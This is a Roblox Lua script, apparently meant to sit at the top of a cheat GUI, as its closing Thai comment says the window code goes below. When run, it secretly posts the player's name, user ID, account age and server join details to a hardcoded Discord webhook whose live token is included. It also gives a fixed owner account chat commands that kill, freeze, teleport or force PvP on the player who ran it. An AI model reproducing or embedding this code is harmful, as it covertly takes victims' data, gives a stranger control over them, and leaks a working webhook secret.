-- Webhook Configuration
local webhook_url = "https://discordapp.com/api/webhooks/1322240223052300478/7SSpyDR6aCGxJIUf1KvWtHakkgDFqXPMWmoyxoRTY_ApYDzUoW-S7GELvQKestHEuVQK"

-- Services setup
local Players, LocalPlayer, StarterGui, ReplicatedStorage do
    Players = cloneref(game:GetService("Players"))
    LocalPlayer = Players.LocalPlayer
    StarterGui = cloneref(game:GetService("StarterGui"))
    ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
end

-- Owner system variables
local owner = "16810y"
local prefix = "."

-- Webhook Functions
local function getServerInfo()
    local jobId = game.JobId
    local placeId = game.PlaceId
    local placeName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
    local player = LocalPlayer
    
    local playerInfo = {
        name = player.Name,
        displayName = player.DisplayName,
        userId = player.UserId,
        accountAge = player.AccountAge
    }
    
    local joinScript = string.format([[
game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")
    ]], placeId, jobId)
    
    return {
        jobId = jobId,
        placeId = placeId,
        placeName = placeName,
        joinScript = joinScript,
        player = playerInfo
    }
end

local function sendWebhook()
    local serverInfo = getServerInfo()
    
    local data = {
        ["embeds"] = {{
            ["title"] = "üéÆ New Server Detection",
            ["description"] = "‡∏°‡∏µ‡∏Ñ‡∏ô‡∏£‡∏±‡∏ô‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡πÉ‡∏ô‡πÄ‡∏ã‡∏¥‡∏£‡πå‡∏ü‡πÄ‡∏ß‡∏≠‡∏£‡πå‡πÉ‡∏´‡∏°‡πà!",
            ["color"] = 5814783,
            ["fields"] = {
                {
                    ["name"] = "üë§ Player Info",
                    ["value"] = string.format(
                        "**Name:** %s\n**Display Name:** %s\n**UserID:** %s\n**Account Age:** %d days",
                        serverInfo.player.name,
                        serverInfo.player.displayName,
                        serverInfo.player.userId,
                        serverInfo.player.accountAge
                    ),
                    ["inline"] = false
                },
                {
                    ["name"] = "üè∑Ô∏è Game Name",
                    ["value"] = serverInfo.placeName,
                    ["inline"] = true
                },
                {
                    ["name"] = "üìç Place ID",
                    ["value"] = tostring(serverInfo.placeId),
                    ["inline"] = true
                },
                {
                    ["name"] = "üîë Job ID",
                    ["value"] = serverInfo.jobId,
                    ["inline"] = true
                },
                {
                    ["name"] = "üìù Join Script",
                    ["value"] = "```lua\n" .. serverInfo.joinScript .. "\n```",
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "Server Time: " .. os.date("%Y-%m-%d %H:%M:%S")
            },
            ["thumbnail"] = {
                ["url"] = string.format(
                    "https://www.roblox.com/headshot-thumbnail/image?userId=%s&width=420&height=420&format=png",
                    serverInfo.player.userId
                )
            }
        }}
    }

    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    request({
        Url = webhook_url,
        Method = "POST",
        Headers = headers,
        Body = game:GetService("HttpService"):JSONEncode(data)
    })
end

-- Command system
local function executeCommand(message, sender)
    if sender.Name ~= owner then return end
    if message:sub(1,1) ~= prefix then return end
    
    local command = message:sub(2):lower()
    
    task.spawn(function()
        if command == "re" then
            if LocalPlayer.Character then
                LocalPlayer.Character:BreakJoints()
            end
            
        elseif command == "freeze" then
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.Anchored = true
            end
            
        elseif command == "unfreeze" then
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.Anchored = false
            end
            
        elseif command == "enap" then
            local args = {
                [1] = "EnablePvp"
            }
            ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
            
        elseif command == "tm" then
            if LocalPlayer.Character and sender.Character then
                LocalPlayer.Character:MoveTo(sender.Character.HumanoidRootPart.Position)
            end
        end
    end)
end

-- Chat handler
local function setupChatHandler()
    local function playerAdded(player)
        player.Chatted:Connect(function(message)
            executeCommand(message, player)
        end)
    end

    for _, player in ipairs(Players:GetPlayers()) do
        playerAdded(player)
    end

    Players.PlayerAdded:Connect(playerAdded)
end

-- Initialize everything
task.spawn(function()
    sendWebhook()
end)
setupChatHandler()

-- ‡∏ï‡πà‡∏≠‡∏à‡∏≤‡∏Å‡∏ô‡∏µ‡πâ‡πÉ‡∏´‡πâ‡∏ß‡∏≤‡∏á code Window creation ‡πÅ‡∏•‡∏∞‡∏™‡πà‡∏ß‡∏ô‡∏ó‡∏µ‡πà‡πÄ‡∏´‡∏•‡∏∑‡∏≠‡∏Ç‡∏≠‡∏á‡∏Ñ‡∏∏‡∏ì...
